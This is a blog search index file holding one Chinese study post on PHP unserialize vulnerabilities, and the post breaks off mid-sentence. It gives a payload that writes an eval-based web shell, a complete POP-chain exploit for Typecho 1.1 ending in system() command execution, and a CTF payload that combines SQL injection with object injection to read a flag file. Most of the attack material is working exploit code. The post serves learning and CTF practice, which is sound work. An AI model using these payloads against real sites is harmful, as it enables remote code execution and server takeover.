<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>unserialize反序列化漏洞学习</title>
      <link href="2019/12/28/hellowolrd/"/>
      <url>2019/12/28/hellowolrd/</url>
      
        <content type="html"><![CDATA[<h1 id="unserialize反序列化漏洞学习"><a href="#unserialize反序列化漏洞学习" class="headerlink" title="unserialize反序列化漏洞学习"></a>unserialize反序列化漏洞学习</h1><blockquote><p>做了三天吧感觉已经可以大致熟悉反序列化的套路了,把反序列化搞出来也很大的提升了代码审计的水平(看cms不再那么头疼了).</p></blockquote><a id="more"></a><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Template</span> </span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$cacheFile</span> = <span class="hljs-string">&#x27;/tmp/cachefile&#x27;</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$template</span> = <span class="hljs-string">&#x27;&lt;div&gt;Welcome back %s&lt;/div&gt;&#x27;</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$data</span> = <span class="hljs-literal">null</span></span>) </span>&#123;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;loadData(<span class="hljs-variable">$data</span>);<br>    <span class="hljs-keyword">$this</span>-&gt;render(<span class="hljs-variable">$data</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadData</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (substr(<span class="hljs-variable">$data</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>) !== <span class="hljs-string">&#x27;O:&#x27;</span><br>      &amp;&amp; !preg_match(<span class="hljs-string">&#x27;/O:\d:\/&#x27;</span>, <span class="hljs-variable">$data</span>)) &#123;<br>      <span class="hljs-keyword">return</span> unserialize(<span class="hljs-variable">$data</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> [];<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">createCache</span>(<span class="hljs-params"><span class="hljs-variable">$file</span> = <span class="hljs-literal">null</span>, <span class="hljs-variable">$tpl</span> = <span class="hljs-literal">null</span></span>) </span>&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$file</span> ?? <span class="hljs-keyword">$this</span>-&gt;cacheFile;<br>    <span class="hljs-variable">$tpl</span> = <span class="hljs-variable">$tpl</span> ?? <span class="hljs-keyword">$this</span>-&gt;template;<br>    file_put_contents(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$tpl</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;<br>    <span class="hljs-keyword">echo</span> sprintf(<br>      <span class="hljs-keyword">$this</span>-&gt;template,<br>      htmlspecialchars(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;name&#x27;</span>])<br>    );<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">$this</span>-&gt;createCache();<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">new</span> Template(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>这道题只是讲一下思路吧 最麻烦的是要绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (substr(<span class="hljs-variable">$data</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>) !== <span class="hljs-string">&#x27;O:&#x27;</span>&amp;&amp; !preg_match(<span class="hljs-string">&#x27;/O:\d:\/&#x27;</span>, <span class="hljs-variable">$data</span>))<br></code></pre></td></tr></table></figure><p>首先第一个是限制反序列化的内容不是一个对象,第二个是不能匹配到O:数字</p><ol><li>第一个可以用数组包含对象反序列化绕过</li><li>第二个需要分析php源码 绕过方式是 O:+数字</li><li>payload:<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Template</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cacheFile</span> = <span class="hljs-string">&#x27;./getshell.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$template</span> = <span class="hljs-string">&#x27;&lt;?php  @eval($_POST[cmd]) ?&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$zyd</span>=<span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> Template());<br><span class="hljs-variable">$zyd</span>=serialize(<span class="hljs-variable">$zyd</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$zyd</span>;<br></code></pre></td></tr></table></figure><blockquote><p>a:1:{i:0;O:+8:”Template”:2:{s:9:”cacheFile”;s:14:”./getshell.php”;s:8:”template”;s:28:”<?php  @eval($_POST[cmd]) ?>“;}}<br>注意这里O:后需要加个+号</p></blockquote><h2 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h2>CMS:Typecho-1.1 版本<br>由于太过于复杂,就讲一下我跟着审计这套cms的思路(反正也是给自己看的)。</li><li>在install.php 发现判断是否安装成功的逻辑可以绕过.</li><li>在绕过安装的逻辑后面发现有反序列化可控点.</li><li>追入这个类发现构造函数将传入的参数进行了字符串拼接。想到如果传入的参数是另一个对象在进行字符串拼接的时候对象会自动调用__toString()魔术方法</li><li>找寻可以利用的__toSting()魔术方法的类</li><li>发现Feed.php下Typecho_Feed类存在可以利用的__toSting()方法<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$content</span> .= <span class="hljs-string">&#x27;&lt;dc:creator&gt;&#x27;</span> . htmlspecialchars(<span class="hljs-variable">$item</span>[<span class="hljs-string">&#x27;author&#x27;</span>]-&gt;screenName) <br></code></pre></td></tr></table></figure></li><li>这里$item[‘author’]-&gt;screenName. 当screenName属性为私有或不存在的时候会自动调用__get()魔术方法.所以将这个参数变为Typecho_Request对象再去寻找__get()魔术方法可以利用的类</li><li>发现Typecho_Request类有可以利用的__get魔术方法且参数可控.最终可控的变量传入_applyFilter方法造成代码执行getshell<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_applyFilter</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;_filter) &#123;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;_filter <span class="hljs-keyword">as</span> <span class="hljs-variable">$filter</span>) &#123;<br>            <span class="hljs-variable">$value</span> = is_array(<span class="hljs-variable">$value</span>) ? array_map(<span class="hljs-variable">$filter</span>, <span class="hljs-variable">$value</span>) : call_user_func(<span class="hljs-variable">$filter</span>, <span class="hljs-variable">$value</span>);<br>        &#125;<br>        <span class="hljs-keyword">$this</span>-&gt;_filter = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$value</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li>总结一下构造思路(只写核心代码 其它细节自己绕过)</li><li>首先构造一个数组,adapte变量里存储可以利用__toSting()魔术方法的对象<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;adapter&#x27;</span>=&gt;<span class="hljs-keyword">new</span> Typecho_Feed(), <span class="hljs-string">&#x27;prefix&#x27;</span>=&gt;<span class="hljs-string">&#x27;1&#x27;</span>);<br></code></pre></td></tr></table></figure></li><li>再在Typecho_Feed类中构造可以调用__get()魔术方法的对象<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">$this</span>-&gt;_items[<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;author&#x27;</span>]=<span class="hljs-keyword">new</span> Typecho_Request();<br></code></pre></td></tr></table></figure></li><li>最后在Typecho_Request类中构造触发applyFilter方法getshell的payload<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-keyword">$this</span>-&gt;_filter[<span class="hljs-number">0</span>]=<span class="hljs-string">&quot;system&quot;</span>;<br><span class="hljs-keyword">$this</span>-&gt;_params[<span class="hljs-string">&#x27;screenName&#x27;</span>]=<span class="hljs-string">&quot;id&quot;</span>;<br></code></pre></td></tr></table></figure></li><li>最终payload<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Request</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_filter</span> =<span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_params</span> = <span class="hljs-keyword">array</span>();<br>     <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">     </span>&#123;<br><br>         <span class="hljs-keyword">$this</span>-&gt;_filter[<span class="hljs-number">0</span>]=<span class="hljs-string">&quot;system&quot;</span>;<br>         <span class="hljs-keyword">$this</span>-&gt;_params[<span class="hljs-string">&#x27;screenName&#x27;</span>]=<span class="hljs-string">&quot;id&quot;</span>;<br>     &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Feed</span></span><br><span class="hljs-class"></span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_type</span>=<span class="hljs-string">&#x27;RSS 2.0&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_items</span> = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">public</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;_items[<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;author&#x27;</span>]=<span class="hljs-keyword">new</span> Typecho_Request();<br>        <span class="hljs-keyword">$this</span>-&gt;_items[<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;category&#x27;</span>]=<span class="hljs-keyword">array</span>();<br>        <span class="hljs-keyword">$this</span>-&gt;_items[<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;category&#x27;</span>][<span class="hljs-number">0</span>]=<span class="hljs-keyword">new</span> Typecho_Request();<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;adapter&#x27;</span>=&gt;<span class="hljs-keyword">new</span> Typecho_Feed(), <span class="hljs-string">&#x27;prefix&#x27;</span>=&gt;<span class="hljs-string">&#x27;1&#x27;</span>);<br><span class="hljs-keyword">echo</span>  base64_encode(serialize(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure></li><li>值得一提的是$item[‘author’]-&gt;screenName 触发的__get()魔术方法的时候screenName属性值其实是不可控的,传入的数值其实就是screenName这个字符串而这个是代码执行的函数参数必须要可控(当时想了好长时间,一直愣头青的想要直接控制这个不存在的属性值).没想到cms作者在重写get()方法将screenName属性值变得可控了。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">switch</span> (<span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;_params[<span class="hljs-variable">$key</span>]):<br>                <span class="hljs-variable">$value</span> = <span class="hljs-keyword">$this</span>-&gt;_params[<span class="hljs-variable">$key</span>];<br>                <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure>所以我们只需要给对象的params[‘screenName ‘]私有变量赋初值就可控了.</li></ol><p>整套cms我只是看了下大致的思路,然后自己一点点追,慢慢构造payload的.整体构造完感觉收获还是蛮大的,给了我很大的自信.（当晚就审出了一套发卡系统的支付后门,之前一看cms就头疼,总有一种无从下手的感觉,现在感觉好多了）</p><h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><p>题 </p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;config.php&quot;</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HITCON</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$method</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$args</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$conn</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;method = <span class="hljs-variable">$method</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;args = <span class="hljs-variable">$args</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;__conn();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__conn</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$db_host</span>, <span class="hljs-variable">$db_name</span>, <span class="hljs-variable">$db_user</span>, <span class="hljs-variable">$db_pass</span>, <span class="hljs-variable">$DEBUG</span>;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;conn)<br>            <span class="hljs-keyword">$this</span>-&gt;conn = mysql_connect(<span class="hljs-variable">$db_host</span>, <span class="hljs-variable">$db_user</span>, <span class="hljs-variable">$db_pass</span>);<br>        mysql_select_db(<span class="hljs-variable">$db_name</span>, <span class="hljs-keyword">$this</span>-&gt;conn);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$DEBUG</span>) &#123;<br><br>            <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;DROP TABLE IF  EXISTS  users&quot;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;__query(<span class="hljs-variable">$sql</span>, <span class="hljs-variable">$back</span>=<span class="hljs-literal">false</span>);<br>            <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;CREATE TABLE IF NOT EXISTS users (username VARCHAR(64),</span><br><span class="hljs-string">            password VARCHAR(64),role VARCHAR(256)) CHARACTER SET utf8&quot;</span>;<br><br>            <span class="hljs-keyword">$this</span>-&gt;__query(<span class="hljs-variable">$sql</span>, <span class="hljs-variable">$back</span>=<span class="hljs-literal">false</span>);<br>            <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO users VALUES (&#x27;orange&#x27;, &#x27;<span class="hljs-subst">$db_pass</span>&#x27;, &#x27;admin&#x27;), (&#x27;phddaa&#x27;, &#x27;ddaa&#x27;, &#x27;user&#x27;)&quot;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;__query(<span class="hljs-variable">$sql</span>, <span class="hljs-variable">$back</span>=<span class="hljs-literal">false</span>);<br>        &#125;<br>        mysql_query(<span class="hljs-string">&quot;SET names utf8&quot;</span>);<br>        mysql_query(<span class="hljs-string">&quot;SET sql_mode = &#x27;strict_all_tables&#x27;&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__query</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span>, <span class="hljs-variable">$back</span>=<span class="hljs-literal">true</span></span>) </span>&#123;<br>        <span class="hljs-variable">$result</span> = @mysql_query(<span class="hljs-variable">$sql</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$back</span>) &#123;<br>            <span class="hljs-keyword">return</span> @mysql_fetch_object(<span class="hljs-variable">$result</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>) = func_get_args();<br>        <span class="hljs-variable">$sql</span> = sprintf(<span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;%s&#x27; AND password=&#x27;%s&#x27;&quot;</span>, <span class="hljs-variable">$username</span>, md5(<span class="hljs-variable">$password</span>));<br>        <span class="hljs-variable">$obj</span> = <span class="hljs-keyword">$this</span>-&gt;__query(<span class="hljs-variable">$sql</span>);<br>        <br><br>        <span class="hljs-keyword">if</span> ( <span class="hljs-variable">$obj</span> != <span class="hljs-literal">false</span> ) &#123;<br>            define(<span class="hljs-string">&#x27;IN_FLAG&#x27;</span>, <span class="hljs-literal">TRUE</span>);<br>            <span class="hljs-keyword">$this</span>-&gt;loadData(<span class="hljs-variable">$obj</span>-&gt;role);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;__die(<span class="hljs-string">&quot;sorry!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadData</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (substr(<span class="hljs-variable">$data</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>) !== <span class="hljs-string">&#x27;O:&#x27;</span> &amp;&amp; !preg_match(<span class="hljs-string">&#x27;/O:\d:/&#x27;</span>, <span class="hljs-variable">$data</span>)) &#123;<br>            <span class="hljs-keyword">return</span> unserialize(<span class="hljs-variable">$data</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> [];<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__die</span>(<span class="hljs-params"><span class="hljs-variable">$msg</span></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;__close();<br>        header(<span class="hljs-string">&quot;Content-Type: application/json&quot;</span>);<br>        <span class="hljs-keyword">die</span>( json_encode( <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;msg&quot;</span>=&gt; <span class="hljs-variable">$msg</span>) ) );<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__close</span>(<span class="hljs-params"></span>) </span>&#123;<br>        mysql_close(<span class="hljs-keyword">$this</span>-&gt;conn);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">source</span>(<span class="hljs-params"></span>) </span>&#123;<br><br><br>        highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;__conn();<br>        <span class="hljs-keyword">if</span> (in_array(<span class="hljs-keyword">$this</span>-&gt;method, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;login&quot;</span>, <span class="hljs-string">&quot;source&quot;</span>))) &#123;<br>            @call_user_func_array(<span class="hljs-keyword">array</span>(<span class="hljs-keyword">$this</span>, <span class="hljs-keyword">$this</span>-&gt;method), <span class="hljs-keyword">$this</span>-&gt;args);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;__die(<span class="hljs-string">&quot;What do you do?&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">$this</span>-&gt;__close();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-keyword">$this</span>-&gt;args <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;args[<span class="hljs-variable">$k</span>] = strtolower(trim(mysql_escape_string(<span class="hljs-variable">$v</span>)));<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SoFun</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;file)) &#123;<br>            <span class="hljs-keyword">include</span> <span class="hljs-keyword">$this</span>-&gt;file;<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt; file=<span class="hljs-string">&#x27;index.php&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]=<span class="hljs-string">&#x27;O:6:&quot;HITCON&quot;:3:&#123;s:6:&quot;method&quot;;s:5:&quot;login&quot;;s:4:&quot;args&quot;;a:2:&#123;i:0;s:77:&quot;1\&#x27; union select 1,2,\&#x27;a:1:&#123;i:0;O:+5:&quot;SoFun&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;\&#x27; #&quot;;i:1;i:456;&#125;&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>])) &#123;<br>    @unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>]);<br><br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">new</span> HITCON(<span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-keyword">array</span>());<br>&#125;<br><br></code></pre></td></tr></table></figure><p>config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$db_host</span> = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br><span class="hljs-variable">$db_name</span> = <span class="hljs-string">&#x27;test&#x27;</span>;<br><span class="hljs-variable">$db_user</span> = <span class="hljs-string">&#x27;root&#x27;</span>;<br><span class="hljs-variable">$db_pass</span> = <span class="hljs-string">&#x27;root&#x27;</span>;<br><span class="hljs-variable">$DEBUG</span> = <span class="hljs-string">&#x27;xx&#x27;</span>;<br></code></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>!defined(<span class="hljs-string">&#x27;IN_FLAG&#x27;</span>) &amp;&amp; <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;Access Denied&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&#123;un3eri@liz3_i3_s0_fun&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><p>因为那套cms水准比这道ctf题高很多,所以并没有花太长时间就做出来了(完全没有看题解),payload已经在index.php中给出了。</p><p>还是只讲一下思路吧(反正只是给自己看）<br>1.这道题涉及一个cve</p><blockquote><p>__wakeup() 当反序列化的属性数大于真实属性数就不会调用这个魔术方法(具体去百度把很简单的),但是我复现一直没复现出来,因为漏洞范围 漏洞影响版本：<br>PHP5 &lt; 5.6.25<br>PHP7 &lt; 